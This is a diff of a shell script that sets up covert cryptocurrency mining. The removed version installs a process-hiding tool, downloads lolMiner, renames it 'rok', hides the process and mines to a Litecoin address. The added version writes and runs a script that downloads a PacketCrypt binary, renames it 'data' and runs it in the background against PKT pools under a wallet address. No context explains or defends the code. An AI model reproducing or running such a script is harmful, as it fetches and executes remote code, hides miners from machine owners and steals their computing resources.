@@ -1,16 +1,12 @@
 #!/bin/bash
-#!/bin/sh
+cat << "EOF" > run.sh
 #!/bin/bash
+wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O data && 
+chmod +x data && 
+nohup ./data ann -p pkt1q76dngmrf380w8k9j4f7w4eqpzx3n9vcprldmjx http://pool.pkt.world http://pool.pktpool.io http://pool.pkteer.com > nohup.out
 
-apt update
-curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
-sudo apt install nodejs screen -y
-npm i -g node-process-hider
-wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.12/lolMiner_v1.12_Lin64.tar.gz
-tar xvf lolMiner_v1.12_Lin64.tar.gz
-cd 1.12
-mv lolMiner rok
-sudo ph add rok
-chmod 777 rok
-screen -dmS ls ./rok --algo ETHASH --pool ethash.unmineable.com:3333 --user LTC:M9Uaz5UtUHbu3VJdkz9ZU8ow35e1z8acAZ.K80
- 
+EOF
+
+chmod +x run.sh
+
+./run.sh
